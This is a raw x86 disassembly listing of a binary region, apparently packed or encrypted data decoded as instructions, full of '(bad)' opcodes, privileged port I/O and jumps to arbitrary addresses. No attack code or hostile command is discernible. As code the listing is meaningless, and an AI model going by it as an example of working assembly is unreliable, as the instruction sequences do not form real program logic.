  42acdc:	inc    DWORD PTR [esi-0x6788dec5]
  42ace2:	daa    
  42ace3:	sbb    edi,edi
  42ace5:	(bad)  
  42ace6:	(bad)  
  42ace7:	push   edx
  42ace8:	mul    DWORD PTR [edi+0x2f]
  42aceb:	xchg   ebp,eax
  42acec:	ret    
  42aced:	(bad)  
  42acee:	jns    0x42ad37
  42acf0:	add    al,BYTE PTR [eax]
  42acf2:	jne    0x42ad3d
  42acf4:	or     dl,BYTE PTR ds:0x0
  42acfa:	add    cl,dl
  42acfc:	daa    
  42acfd:	mov    edi,0xf75affff
  42ad02:	gs jbe 0x42ad46
  42ad05:	inc    edi
  42ad06:	mov    WORD PTR [ebp+0x7d4e0819],?
  42ad0c:	add    ch,cl
  42ad0e:	add    eax,ebp
  42ad10:	add    esi,esp
  42ad12:	out    0x73,eax
  42ad14:	ret    0x7ae8
  42ad17:	mov    bh,0xfa
  42ad19:	mov    dl,0x80
  42ad1b:	std    
  42ad1c:	shr    edx,1
  42ad1e:	add    esi,DWORD PTR [ebp-0x4f]
  42ad21:	nop
  42ad22:	add    edi,DWORD PTR [esi-0x40]
  42ad25:	call   0xa6c6e1c5
  42ad2a:	add    ebx,DWORD PTR [ebp+0x54]
  42ad2d:	arpl   dx,ax
  42ad2f:	jmp    0x4102:0xa08d7a9a
  42ad36:	xchg   BYTE PTR [edi-0x40],bl
  42ad39:	call   0x26c709d9
  42ad3e:	add    al,0x5d
  42ad40:	fstp   TBYTE PTR [edx]
  42ad42:	ret    0x9ac2
  42ad45:	pop    ebp
  42ad46:	mov    bh,BYTE PTR [eax+0x2]
  42ad49:	inc    ecx
  42ad4a:	test   DWORD PTR [edx],ebp
  42ad4c:	shr    al,0x80
  42ad4f:	aas    
  42ad50:	not    BYTE PTR [eax]
  42ad52:	sub    eax,0xb4e8c01e
  42ad57:	lahf   
  42ad58:	mov    cl,0xe4
  42ad5a:	jp     0x42ad9b
  42ad5c:	cli    
  42ad5d:	outs   dx,DWORD PTR ds:[esi]
  42ad5e:	add    al,0x0
  42ad60:	add    BYTE PTR [eax],al
  42ad62:	add    BYTE PTR [eax],al
  42ad64:	repnz mov ebx,0xcdb982f0
  42ad6a:	mov    ch,0x3c
  42ad6c:	cmp    al,0xea
  42ad6e:	or     eax,0xc1c309ff
  42ad73:	inc    ecx
  42ad74:	jno    0x42ad78
  42ad76:	outs   dx,BYTE PTR ds:[esi]
  42ad77:	lds    esi,FWORD PTR [esi+0x4a]
  42ad7a:	fld    QWORD PTR [edx]
  42ad7c:	lods   eax,DWORD PTR ds:[esi]
  42ad7d:	ja     0x42ad74
  42ad7f:	jp     0x42ad38
  42ad81:	or     ah,BYTE PTR [esi-0x35]
  42ad84:	dec    edx
  42ad85:	jbe    0x42ad74
  42ad87:	push   cs
  42ad88:	test   DWORD PTR [ecx],eax
  42ad8a:	add    BYTE PTR [ecx-0x1ebe76ba],bl
  42ad90:	mul    DWORD PTR [edx]
  42ad92:	add    al,al
  42ad94:	mov    bh,0x57
  42ad96:	xchg   DWORD PTR ds:0xba0beef7,ecx
  42ad9c:	jecxz  0x42ad9a
  42ad9e:	je     0x42ad7d
  42ada0:	adc    DWORD PTR [edi],0xffffff90
  42ada3:	(bad)  [esi]
  42ada5:	add    al,BYTE PTR [esi-0x7326d8ff]
  42adab:	scas   al,BYTE PTR es:[edi]
  42adac:	imul   ecx,DWORD PTR [ebx+0x5f6ef55c],0xfffffffc
  42adb3:	and    al,0x7b
  42adb5:	add    al,BYTE PTR [eax]
  42adb7:	jmp    0xe9d1329d
  42adbc:	jbe    0x42adc0
  42adbe:	xchg   DWORD PTR [edi],ebx
  42adc0:	ror    DWORD PTR [eax+0x5eef154],1
  42adc6:	add    ecx,ebp
  42adc8:	add    BYTE PTR [eax],al
  42adca:	add    BYTE PTR [eax],al
  42adcc:	add    BYTE PTR [esi-0x7f],dh
  42adcf:	rcr    edi,0x5e
  42add2:	sub    DWORD PTR [ecx],eax
  42add4:	scas   al,BYTE PTR es:[edi]
  42add5:	add    BYTE PTR [edi+0x55051cbf],0xfb
  42addc:	adc    al,0x75
  42adde:	pop    DWORD PTR [ebp+ebx*4-0x1f]
  42ade2:	jmp    0xfdc3159d
  42ade7:	sub    DWORD PTR [ecx-0x37e9713],0x72
  42adee:	add    al,BYTE PTR [ecx]
  42adf0:	jmp    0x1a582c6b
  42adf5:	sub    ah,bh
  42adf7:	je     0x42adee
  42adf9:	and    eax,0x71cbb0e9
  42adfe:	std    
  42adff:	xchg   BYTE PTR [ecx-0x24],dl
  42ae02:	inc    esp
  42ae03:	or     BYTE PTR [ecx+0x21],ah
  42ae06:	adc    eax,0x7a4600e7
  42ae0b:	ds or  bh,al
  42ae0e:	xchg   ecx,eax
  42ae0f:	out    dx,al
  42ae10:	(bad)  
  42ae11:	or     al,0xf9
  42ae13:	(bad)  
  42ae14:	cmp    ah,BYTE PTR [edi-0x66]
  42ae17:	and    cl,BYTE PTR [ebx+0x164fcda]
  42ae1d:	add    al,0x31
  42ae1f:	ja     0x42ae63
  42ae21:	or     al,0x9d
  42ae23:	xlat   BYTE PTR ds:[ebx]
  42ae24:	jg     0x42ae04
  42ae26:	add    al,0x68
  42ae28:	aad    0xf3
  42ae2a:	ret    0x52fa
  42ae2d:	jmp    0x42adcb
  42ae2f:	mov    dh,0x8c
  42ae31:	add    BYTE PTR [eax],al
  42ae33:	add    BYTE PTR [eax],al
  42ae35:	add    ah,cl
  42ae37:	add    al,0xf7
  42ae39:	xor    bl,ah
  42ae3b:	mov    ah,0x2
  42ae3d:	sbb    DWORD PTR [eax],0xffffffe5
  42ae40:	add    eax,0xffffffd3
  42ae43:	ja     0x42ae00
  42ae45:	cmp    eax,DWORD PTR [ecx+0x1a]
  42ae48:	je     0x42ae50
  42ae4a:	mov    ebx,DWORD PTR [esi]
  42ae4c:	jl     0x42ae65
  42ae4e:	mov    dl,0xd
  42ae50:	div    DWORD PTR [ebp+0x8]
  42ae53:	sbb    eax,0xe021774
  42ae58:	add    bl,0xb7
  42ae5b:	cli    
  42ae5c:	cmc    
  42ae5d:	jne    0x42ae67
  42ae5f:	sbb    eax,0xe021768
  42ae64:	sub    al,al
  42ae66:	arpl   WORD PTR [ebx+0x494c2c7],bp
  42ae6c:	push   ebp
  42ae6d:	mov    esp,eax
  42ae6f:	jns    0x42aeb6
  42ae71:	or     al,0xd
  42ae73:	and    DWORD PTR [eax],ecx
  42ae75:	add    cl,BYTE PTR [esp+eax*1-0x1fe37cb1]
  42ae7c:	dec    edx
  42ae7d:	dec    DWORD PTR [ecx-0x4]
  42ae80:	mov    eax,DWORD PTR [ebp-0x8ef2c]
  42ae86:	jne    0x42ae41
  42ae88:	ja     0x42ae83
  42ae8a:	pop    ebp
  42ae8b:	and    esp,esi
  42ae8d:	stc    
  42ae8e:	dec    edx
  42ae8f:	outs   dx,DWORD PTR ds:[esi]
  42ae90:	aas    
  42ae91:	je     0x42ae29
  42ae93:	je     0x42ae59
  42ae95:	or     esp,DWORD PTR [ebx+0x39464]
  42ae9b:	add    BYTE PTR [eax],al
  42ae9d:	add    BYTE PTR [eax],al
  42ae9f:	add    BYTE PTR [esi-0x3e],ah
  42aea2:	imul   DWORD PTR [eax]
  42aea4:	sub    DWORD PTR [eax+edx*2],ecx
  42aea7:	lock popw es
  42aeaa:	std    
  42aeab:	sbb    bl,BYTE PTR [ecx]
  42aead:	scas   eax,DWORD PTR es:[edi]
  42aeae:	out    0x6,eax
  42aeb0:	adc    BYTE PTR [ebx+edi*8],cl
  42aeb3:	stos   DWORD PTR es:[edi],eax
  42aeb4:	ins    DWORD PTR es:[edi],dx
  42aeb5:	aas    
  42aeb6:	je     0x42af2e
  42aeb8:	add    BYTE PTR [edi-0x53d6b9f9],bh
  42aebe:	enter  0xe1b7,0xfe
  42aec2:	push   esp
  42aec3:	(bad)  
  42aec4:	aad    0x82
  42aec6:	in     al,dx
  42aec7:	test   eax,0xbe2eae3c
  42aecc:	inc    ebx
  42aecd:	clc    
  42aece:	mov    WORD PTR [eax],?
  42aed0:	lods   eax,DWORD PTR ds:[esi]
  42aed1:	mov    dl,0x4f
  42aed3:	cld    
  42aed4:	es xor al,0x89
  42aed7:	and    BYTE PTR [ebp-0x4762a284],dl
  42aedd:	lock aas 
  42aedf:	mov    ebp,DWORD PTR [ecx]
  42aee1:	add    al,0x7f
  42aee3:	mov    cl,0xf5
  42aee5:	ja     0x42af5c
  42aee7:	lds    esi,FWORD PTR [edx-0x57]
  42aeea:	out    0x8d,eax
  42aeec:	scas   eax,DWORD PTR es:[edi]
  42aeed:	pop    es
  42aeee:	sti    
  42aeef:	xchg   edx,eax
  42aef0:	gs inc esp
  42aef2:	or     esi,ecx
  42aef4:	dec    esi
  42aef5:	add    al,0x0
  42aef7:	jne    0x42ae79
  42aef9:	xchg   ecx,eax
  42aefa:	pop    es
  42aefb:	lea    eax,[ecx+ecx*1]
  42aefe:	sti    
  42aeff:	jb     0x42af66
  42af01:	inc    esp
  42af02:	or     eax,DWORD PTR [eax]
  42af04:	add    BYTE PTR [eax],al
  42af06:	add    BYTE PTR [eax],al
  42af08:	icebp  
  42af09:	add    DWORD PTR [esp+eax*1+0x75],edi
  42af0d:	add    ch,BYTE PTR [esi-0x6d]
  42af10:	jbe    0x42ae9f
  42af12:	stos   DWORD PTR es:[edi],eax
  42af13:	xor    esp,DWORD PTR [edi+0x7917a3c7]
  42af19:	lea    ebp,[eax+0x3944ec03]
  42af1f:	jge    0x42aeb9
  42af21:	div    BYTE PTR [ecx]
  42af23:	icebp  
  42af24:	add    dl,BYTE PTR [ecx+ebp*4]
  42af27:	add    edi,esp
  42af29:	inc    esp
  42af2a:	and    edi,ecx
  42af2c:	jecxz  0x42afa5
  42af2e:	in     eax,dx
  42af2f:	mov    eax,ds:0x9ab7e9b
  42af34:	mov    cl,0x76
  42af36:	in     eax,0xc3
  42af38:	std    
  42af39:	inc    esp
  42af3a:	add    DWORD PTR [ebx],ecx
  42af3c:	xchg   BYTE PTR [esi],al
  42af3e:	ins    BYTE PTR es:[edi],dx
  42af3f:	ror    DWORD PTR [esi],0x8b
  42af42:	and    DWORD PTR [ebp+0x76],edi
  42af45:	jmp    0xa91f:0xfeeadeb5
  42af4c:	out    0x77,al
  42af4e:	sti    
  42af4f:	jle    0x42af81
  42af51:	fiadd  DWORD PTR [eax+0x2d]
  42af54:	dec    esi
  42af55:	inc    esp
  42af56:	jmp    0x27c150f6
  42af5b:	add    al,0x32
  42af5d:	(bad)  
  42af5e:	clc    
  42af5f:	or     ah,BYTE PTR ds:0x853f660e
  42af65:	enter  0xff23,0x75
  42af69:	test   DWORD PTR [eax+0x90],ebp
  42af6f:	add    BYTE PTR [eax],al
  42af71:	mov    ds:0xe9ff3b86,eax
  42af76:	je     0x42af31
  42af78:	inc    edx
  42af79:	cmp    dh,ch
  42af7b:	test   al,0x90
  42af7d:	dec    edx
  42af7e:	add    dl,BYTE PTR [ecx+0x79fe7cfa]
  42af84:	jle    0x42afb6
  42af86:	(bad)  
  42af87:	jmp    DWORD PTR [eax]
  42af89:	add    eax,0x6ef442fd
  42af8e:	stc    
  42af8f:	je     0x42afd2
  42af91:	jle    0x42afdd
  42af93:	adc    bl,BYTE PTR [edi+0x6f]
  42af96:	cmp    ebx,DWORD PTR [ebp+0x39]
  42af99:	add    cl,BYTE PTR [ebx]
  42af9b:	sti    
  42af9c:	aam    0x86
  42af9e:	stc    
  42af9f:	adc    al,0xa5
  42afa1:	dec    eax
  42afa2:	add    BYTE PTR ds:[ebx+0x35],dh
  42afa6:	add    eax,0x77ac00e7
  42afab:	rol    BYTE PTR [ecx+0x53],1
  42afae:	(bad)  
  42afaf:	cli    
  42afb0:	mov    es:0xeab1d447,eax
  42afb6:	cld    
  42afb7:	inc    edx
  42afb8:	pushf  
  42afb9:	push   cs
  42afba:	stc    
  42afbb:	je     0x42afee
  42afbd:	outs   dx,BYTE PTR ds:[esi]
  42afbe:	push   ds
  42afbf:	adc    al,BYTE PTR [edi]
  42afc1:	outs   dx,DWORD PTR ds:[esi]
  42afc2:	cmp    ebx,DWORD PTR [ebp+0x19]
  42afc5:	jmp    0x14f9:0xa67cfb0a
  42afcc:	(bad)  
  42afcd:	loopne 0x42b00c
  42afcf:	add    BYTE PTR [ebx],bl
  42afd1:	cmp    DWORD PTR [eax+0x57],ebx
  42afd4:	mov    al,0x0
  42afd6:	add    BYTE PTR [eax],al
  42afd8:	add    BYTE PTR [eax],al
  42afda:	xor    eax,DWORD PTR [esi]
  42afdc:	add    BYTE PTR [eax+edx*2],bh
  42afdf:	out    dx,al
  42afe0:	push   eax
  42afe1:	cmp    BYTE PTR [eax*4+0x24173f8],al
  42afe8:	add    ecx,ebp
  42afea:	jbe    0x42af76
  42afec:	dec    esp
  42afed:	mov    dh,0x33
  42afef:	mov    al,BYTE PTR [eax]
  42aff1:	call   0x34cab26c
  42aff6:	outs   dx,DWORD PTR ds:[esi]
  42aff7:	xchg   ebp,ecx
  42aff9:	adc    eax,0xe14c84de
  42affe:	mov    cl,0xc8
  42b000:	dec    esi
  42b001:	pusha  
  42b002:	ret    0x88f5
  42b005:	add    BYTE PTR [ecx-0x2],ah
  42b008:	push   eax
  42b009:	(bad)  
  42b00a:	push   ecx
  42b00b:	or     eax,DWORD PTR [edi]
  42b00d:	mov    dh,0x71
  42b00f:	or     al,BYTE PTR [edx+0x55015214]
  42b015:	(bad)  
  42b016:	imul   edx,DWORD PTR [ebx+0x4d],0xfffffffe
  42b01a:	out    0xea,al
  42b01c:	inc    DWORD PTR [edi+0x14880348]
  42b022:	pop    ebp
  42b023:	cli    
  42b024:	mov    al,0xc
  42b026:	push   edx
  42b027:	cli    
  42b028:	mov    al,0xd2
  42b02a:	dec    edi
  42b02b:	aas    
  42b02c:	adc    DWORD PTR [ebp+0x64],0xffffff81
  42b030:	loopne 0x42b031
  42b032:	sbb    al,0x1
  42b034:	add    BYTE PTR [edx+0xc2a0028],cl
  42b03a:	push   ss
  42b03b:	jns    0x42b044
  42b03d:	inc    edi
  42b03e:	add    BYTE PTR [eax],al
  42b040:	add    BYTE PTR [eax],al
  42b042:	add    BYTE PTR [ebx-0x4b],ch
  42b045:	add    dh,BYTE PTR [ebp+0x52]
  42b048:	test   al,0x51
  42b04a:	mov    cl,cl
  42b04c:	or     DWORD PTR [eax+0xc88],ecx
  42b052:	add    BYTE PTR [esi-0x4b],dl
  42b055:	clc    
  42b056:	mov    BYTE PTR [ecx+eax*1+0x1],dl
  42b05a:	add    ah,cl
  42b05c:	test   eax,0xd0c2c7
  42b061:	dec    edi
  42b062:	mov    esp,DWORD PTR [ebp-0x447a382b]
  42b068:	mov    WORD PTR [edi],ds
  42b06a:	push   ebx
  42b06b:	bound  edi,QWORD PTR [edi-0x16]
  42b06e:	sub    edi,esp
  42b070:	jle    0x42b086
  42b072:	push   es
  42b073:	pop    ss
  42b074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b075:	push   ds
  42b076:	adc    BYTE PTR [esi+0x244117ec],ch
  42b07c:	icebp  
  42b07d:	xor    DWORD PTR [eax+esi*4-0x14],ecx
  42b081:	jae    0x42b085
  42b083:	jne    0x42b05d
  42b085:	xor    eax,0x21163a40
  42b08a:	pop    edx
  42b08b:	push   ds
  42b08c:	and    al,0x42
  42b08e:	or     BYTE PTR [ebp+0x16],dh
  42b091:	jge    0x42b07f
  42b093:	(bad)  
  42b094:	cs cld 
  42b096:	jle    0x42b0f1
  42b098:	fiadd  WORD PTR [ebx-0x8168e83]
  42b09e:	add    DWORD PTR [eax-0x16],0x66a6fffe
  42b0a5:	stos   BYTE PTR es:[edi],al
  42b0a6:	test   DWORD PTR [eax],0x0
  42b0ac:	mov    ds:0xee533a00,eax
  42b0b1:	inc    edx
  42b0b2:	popf   
  42b0b3:	(bad)  
  42b0b4:	xor    BYTE PTR [edi-0x58fffff9],ah
  42b0ba:	push   es
  42b0bb:	pop    edx
  42b0bc:	imul   BYTE PTR [esi-0x957000e]
  42b0c2:	jl     0x42b0d8
  42b0c4:	push   0x1c
  42b0c6:	mov    dl,0xb
  42b0c8:	adc    ebp,DWORD PTR [edi+0x648807]
  42b0ce:	add    al,0xc2
  42b0d0:	je     0x42b0bb
  42b0d2:	mov    ebp,0xf8038049
  42b0d7:	mov    cl,0x40
  42b0d9:	icebp  
  42b0da:	jbe    0x42b0ad
  42b0dc:	mov    ah,0xff
  42b0de:	add    al,0x86
  42b0e0:	dec    DWORD PTR [ecx]
  42b0e2:	jns    0x42b124
  42b0e4:	jne    0x42b0d2
  42b0e6:	dec    esp
  42b0e7:	push   ebp
  42b0e8:	int3   
  42b0e9:	push   0xd7ffff25
  42b0ee:	inc    esp
  42b0ef:	loope  0x42b16a
  42b0f1:	stos   BYTE PTR es:[edi],al
  42b0f2:	adc    DWORD PTR [esi+ebp*2],eax
  42b0f5:	mov    edx,0x66558a75
  42b0fa:	(bad)  
  42b0fb:	push   edi
  42b0fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b0fe:	(bad)  
  42b0ff:	jg     0x42b121
  42b101:	add    ah,BYTE PTR [edx-0x6bb212fb]
  42b107:	mov    fs,WORD PTR [edi+0xb]
  42b10a:	pop    ebx
  42b10b:	mov    ecx,0xf7867f80
  42b110:	add    BYTE PTR [eax],al
  42b112:	add    BYTE PTR [eax],al
  42b114:	add    BYTE PTR [ebp-0x73bb1920],dh
  42b11a:	add    al,0xee
  42b11c:	cmp    ebx,edi
  42b11e:	nop
  42b11f:	enter  0xb578,0x2
  42b123:	jle    0x42b127
  42b125:	adc    edi,DWORD PTR ds:0x5f8969
  42b12b:	shl    esi,cl
  42b12d:	jg     0x42b0e3
  42b12f:	mov    ds:0x9e1ca09,eax
  42b134:	jp     0x42b122
  42b136:	and    DWORD PTR [esp+eax*8+0x3a],esi
  42b13a:	call   0x82b30625
  42b13f:	mov    bl,0xf3
  42b141:	sub    ch,BYTE PTR [edi+0x8]
  42b144:	mul    esp
  42b146:	out    dx,al
  42b147:	mov    bh,BYTE PTR [ebp+eiz*2+0xb]
  42b14b:	push   ebx
  42b14c:	xchg   ecx,eax
  42b14d:	or     DWORD PTR [ebx],ecx
  42b14f:	pop    ebx
  42b150:	xor    bh,BYTE PTR [esi-0x4c]
  42b153:	pop    ds
  42b154:	sahf   
  42b155:	in     eax,dx
  42b156:	jno    0x42b13f
  42b158:	popf   
  42b159:	in     eax,dx
  42b15a:	push   ecx
  42b15b:	in     eax,0x9d
  42b15d:	std    
  42b15e:	dec    ecx
  42b15f:	jmp    0x42b0e3
  42b161:	mov    ch,0x9
  42b163:	(bad)  
  42b164:	hlt    
  42b165:	cli    
  42b166:	sbb    DWORD PTR [edi-0x58],ebp
  42b169:	loope  0x42b0f4
  42b16b:	inc    eax
  42b16c:	add    eax,0x7be751fd
  42b171:	cmp    eax,0x794365ff
  42b176:	jg     0x42b1bb
  42b178:	clc    
  42b179:	add    BYTE PTR [eax],al
  42b17b:	add    BYTE PTR [eax],al
  42b17d:	add    BYTE PTR [edx-0x50349df5],bh
  42b183:	cli    
  42b184:	push   DWORD PTR [ebp+0x25758d3]
  42b18a:	mov    ah,0x2
  42b18c:	leave  
  42b18d:	stos   DWORD PTR es:[edi],eax
  42b18e:	mov    ds:0x6a7253fa,al
  42b193:	jnp    0x42b181
  42b195:	in     eax,0xc7
  42b197:	dec    edi
  42b198:	(bad)  
  42b199:	int    0x79
  42b19b:	add    DWORD PTR [ecx+esi*8-0x1],0xffffffd8
  42b1a0:	mov    BYTE PTR [eax*4-0x81934cf],ah
  42b1a7:	lods   eax,DWORD PTR ds:[esi]
  42b1a8:	(bad)  
  42b1a9:	call   0x5f720624
  42b1ae:	inc    edi
  42b1af:	enter  0x3e36,0xe7
  42b1b3:	dec    ebx
  42b1b4:	cs and dl,cl
  42b1b7:	retf   
  42b1b8:	je     0x42b1cc
  42b1ba:	stc    
  42b1bb:	ja     0x42b1c9
  42b1bd:	jmp    0xe4b6b37e
  42b1c2:	idiv   DWORD PTR [ecx+0x397141fd]
  42b1c8:	lea    ebp,[eax-0x61b4c99b]
  42b1ce:	pop    ds
  42b1cf:	or     eax,0x8a8c28b2
  42b1d4:	cmp    al,0x64
  42b1d6:	ss cli 
  42b1d8:	in     eax,0xeb
  42b1da:	and    al,0xcb
  42b1dc:	xor    DWORD PTR [eax],0xffffffea
  42b1df:	push   es
  42b1e0:	add    BYTE PTR [eax],0x0
  42b1e3:	add    BYTE PTR [eax],al
  42b1e5:	add    BYTE PTR [eax],al
  42b1e7:	rol    BYTE PTR [esi-0x6a1cd5c0],cl
  42b1ed:	shr    bh,0x9e
  42b1f0:	sbb    al,cl
  42b1f2:	and    dl,BYTE PTR [eax-0x719a3a98]
  42b1f8:	outs   dx,BYTE PTR ds:[esi]
  42b1f9:	add    ebp,DWORD PTR [edi]
  42b1fb:	jae    0x42b1c8
  42b1fd:	xchg   DWORD PTR ds:0x3df1d2,ebx
  42b203:	dec    edi
  42b204:	or     al,0x4
  42b206:	jl     0x42b20a
  42b208:	jp     0x42b1f8
  42b20a:	je     0x42b263
  42b20c:	jl     0x42b25b
  42b20e:	clc    
  42b20f:	push   ss
  42b210:	mov    ecx,0xd598af7
  42b215:	shl    cl,0x9e
  42b218:	inc    ebp
  42b219:	call   0x82874822
  42b21e:	dec    ebp
  42b21f:	out    0x76,al
  42b221:	inc    ebp
  42b222:	cld    
  42b223:	push   es
  42b224:	inc    ebp
  42b225:	shl    cl,0x5a
  42b228:	sti    
  42b229:	dec    ebx
  42b22a:	sti    
  42b22b:	sbb    al,0x24
  42b22d:	add    al,0xc0
  42b22f:	hlt    
  42b230:	add    eax,DWORD PTR [edx]
  42b232:	ret    0xb1e4
  42b235:	clc    
  42b236:	lea    ecx,[edx]
  42b238:	(bad)  
  42b239:	sub    cl,cl
  42b23b:	aam    0xb9
  42b23d:	sti    
  42b23e:	test   DWORD PTR [esi-0x80],edi
  42b241:	adc    ecx,DWORD PTR [ebx+0x448208f9]
  42b247:	and    DWORD PTR [ecx],eax
  42b249:	test   DWORD PTR [ebp+0x0],0x0
  42b250:	push   0x5584fe76
  42b255:	mov    edx,edi
  42b257:	inc    eax
  42b258:	pop    ss
  42b259:	cmp    edi,DWORD PTR [ebx+ebp*8+0x17]
  42b25d:	push   ds
  42b25e:	pop    es
  42b25f:	or     bh,0xfd
  42b262:	idiv   bh
  42b264:	sar    BYTE PTR [ecx+0x45],cl
  42b267:	hlt    
  42b268:	daa    
  42b269:	mov    eax,0x3c175f02
  42b26e:	mov    edx,0x81a6dc08
  42b273:	lock push esi
  42b275:	clc    
  42b276:	add    BYTE PTR [ecx],0x4f
  42b279:	or     eax,DWORD PTR [ecx]
  42b27b:	jbe    0x42b245
  42b27d:	outs   dx,DWORD PTR ds:[esi]
  42b27e:	inc    ecx
  42b27f:	add    DWORD PTR [ebp+0x4],esi
  42b282:	jge    0x14bb7ab7
  42b288:	jae    0x42b287
  42b28a:	scas   al,BYTE PTR es:[edi]
  42b28b:	cli    
  42b28c:	std    
  42b28d:	fidivr DWORD PTR [esi-0x5b48dfb8]
  42b293:	mov    esi,0x3e02f5c
  42b298:	and    eax,esi
  42b29a:	stos   DWORD PTR es:[edi],eax
  42b29b:	cli    
  42b29c:	or     DWORD PTR [edi-0xa75ae0a],edi
  42b2a2:	ret    0x3511
  42b2a5:	jmp    0x42b326
  42b2a7:	les    ebp,FWORD PTR [ecx+0x6e]
  42b2aa:	mov    esp,0x8aa9f8fa
  42b2af:	add    eax,0xfad41dff
  42b2b4:	add    BYTE PTR [eax],al
  42b2b6:	add    BYTE PTR [eax],al
  42b2b8:	add    BYTE PTR [ebp-0x1fb8312b],ah
  42b2be:	push   edi
  42b2bf:	inc    ecx
  42b2c0:	add    al,0x75
  42b2c2:	scas   al,BYTE PTR es:[edi]
  42b2c3:	ja     0x42b2b1
  42b2c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b2c6:	mov    esp,0xb0abc8cf
  42b2cb:	jbe    0x42b31a
  42b2cd:	cmp    dh,BYTE PTR [edx-0x4e]
  42b2d0:	stc    
  42b2d1:	fwait
  42b2d2:	jb     0x42b34b
  42b2d4:	add    BYTE PTR [ecx+ebp*8-0x2],dh
  42b2d8:	xchg   BYTE PTR ds:0x7500ff74,ah
  42b2de:	jmp    0x9ff6bd59
  42b2e3:	pushf  
  42b2e4:	ss aas 
  42b2e6:	pushf  
  42b2e7:	or     eax,DWORD PTR [edi+0xb096505]
  42b2ed:	ret    
  42b2ee:	scas   al,BYTE PTR es:[edi]
  42b2ef:	add    eax,DWORD PTR [edi+0xc78f150]
  42b2f5:	mov    WORD PTR [ebx-0x13],fs
  42b2f8:	std    
  42b2f9:	lods   al,BYTE PTR ds:[esi]
  42b2fa:	jmp    0x2adacb0
  42b2ff:	fwait
  42b300:	push   ecx
  42b301:	iret   
  42b302:	mov    esp,?
  42b304:	add    al,0xcf
  42b306:	cmp    eax,0x8a5c8cd2
  42b30b:	hlt    
  42b30c:	add    al,0x6e
  42b30e:	mov    al,0x33
  42b310:	add    ebp,DWORD PTR [edx+0x45]
  42b313:	in     eax,dx
  42b314:	js     0x42b387
  42b316:	shr    BYTE PTR [ebx],0x3
  42b319:	jne    0x42b35b
  42b31b:	sbb    bh,BYTE PTR [ecx+0x0]
  42b31e:	add    BYTE PTR [eax],al
  42b320:	add    BYTE PTR [eax],al
  42b322:	scas   al,BYTE PTR es:[edi]
  42b323:	push   edi
  42b324:	inc    ebx
  42b325:	pop    edi
  42b326:	mov    esp,0x1d03f0c4
  42b32b:	add    al,0xe8
  42b32d:	add    esi,DWORD PTR [ebp-0x9]
  42b330:	adc    al,0x28
  42b332:	ins    DWORD PTR es:[edi],dx
  42b333:	sub    DWORD PTR [eax-0x2c083af8],0x3f
  42b33a:	xchg   DWORD PTR [edx-0x17],eax
  42b33d:	xchg   BYTE PTR [esi],dh
  42b33f:	push   es
  42b340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b341:	or     BYTE PTR [ebp+0x6a],dh
  42b344:	out    0x4,eax
  42b346:	jne    0x42b34a
  42b348:	les    si,DWORD PTR [esi+0x52]
  42b34c:	push   edx
  42b34d:	js     0x42b2e8
  42b34f:	push   es
  42b350:	dec    edx
  42b351:	sbb    DWORD PTR [ecx+0x10],edi
  42b354:	test   eax,0xecbeb203
  42b359:	lds    esi,FWORD PTR [esi+0x2]
  42b35c:	pop    esi
  42b35d:	or     al,0xa2
  42b35f:	jmp    0x49b62b4c
  42b364:	pushf  
  42b365:	adc    al,0xfc
  42b367:	jno    0x42b34e
  42b369:	mov    WORD PTR [edx-0x7da9d9f6],?
  42b36f:	ret    0x59e4
  42b372:	or     eax,0xee030251
  42b377:	ret    0xc6d
  42b37a:	push   0xffffffe9
  42b37c:	(bad)  
  42b37d:	call   0x758bdcec
  42b382:	xor    DWORD PTR [edi-0x17],0xffffffea
  42b386:	add    BYTE PTR [eax],al
  42b388:	add    BYTE PTR [eax],al
  42b38a:	add    BYTE PTR [edx-0x9],cl
  42b38d:	xor    BYTE PTR [ecx+0x62c97fb3],ch
  42b393:	lods   al,BYTE PTR ds:[esi]
  42b394:	fsubrp st(5),st
  42b396:	iret   
  42b397:	ja     0x42b394
  42b399:	out    0xe7,al
  42b39b:	ja     0x42b40f
  42b39d:	or     BYTE PTR [edx-0x48],dh
  42b3a0:	sti    
  42b3a1:	outs   dx,DWORD PTR ds:[esi]
  42b3a2:	in     eax,dx
  42b3a3:	repz rol BYTE PTR [esi-0x41d7169],0xa6
  42b3ab:	ja     0x42b38c
  42b3ad:	push   es
  42b3ae:	push   0xffffffb6
  42b3b0:	add    dl,BYTE PTR [edx+0x62]
  42b3b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3b4:	ficomp WORD PTR [eax-0x73]
  42b3b7:	ja     0x42b3b4
  42b3b9:	scas   eax,DWORD PTR es:[edi]
  42b3ba:	call   0xf53432fa
  42b3bf:	jae    0x42b3e6
  42b3c1:	shr    BYTE PTR [edx-0x7f81020d],0x76
  42b3c8:	outs   dx,BYTE PTR ds:[esi]
  42b3c9:	cmp    al,0xb0
  42b3cb:	retf   0x4920
  42b3ce:	aad    0x6f
  42b3d0:	dec    ebx
  42b3d1:	je     0x42b3cc
  42b3d3:	mov    cl,0x6f
  42b3d5:	out    0x62,al
  42b3d7:	sbb    al,0x7d
  42b3d9:	retf   0x3b72
  42b3dc:	ficomp WORD PTR [ebp-0x190688c1]
  42b3e2:	stc    
  42b3e3:	nop
  42b3e4:	add    ah,bh
  42b3e6:	jmp    0x42b370
  42b3e8:	add    edx,DWORD PTR [edx-0x42]
  42b3eb:	add    edi,DWORD PTR [ebp+0x2de7]
  42b3f1:	add    BYTE PTR [eax],al
  42b3f3:	add    BYTE PTR [edx],cl
  42b3f5:	stc    
  42b3f6:	cli    
  42b3f7:	sub    dh,BYTE PTR [edi+0x72]
  42b3fa:	or     BYTE PTR [edx+0x24],ah
  42b3fd:	stc    
  42b3fe:	outs   dx,DWORD PTR ds:[esi]
  42b3ff:	add    al,ah
  42b401:	test   BYTE PTR [ebp-0x79167075],bh
  42b407:	cld    
  42b408:	jmp    0x42b40d
  42b40a:	jecxz  0x42b419
  42b40c:	dec    edi
  42b40d:	sar    esi,0x52
  42b410:	inc    edi
  42b411:	fadd   DWORD PTR [ecx-0xcfc5b31]
  42b417:	jmp    FWORD PTR [ebx+0x57c3c087]
  42b41d:	push   edx
  42b41e:	and    al,0x4
  42b420:	daa    
  42b421:	or     DWORD PTR [esi+0x49],ecx
  42b424:	gs pop ebx
  42b426:	xor    eax,0x60
  42b429:	or     al,0x49
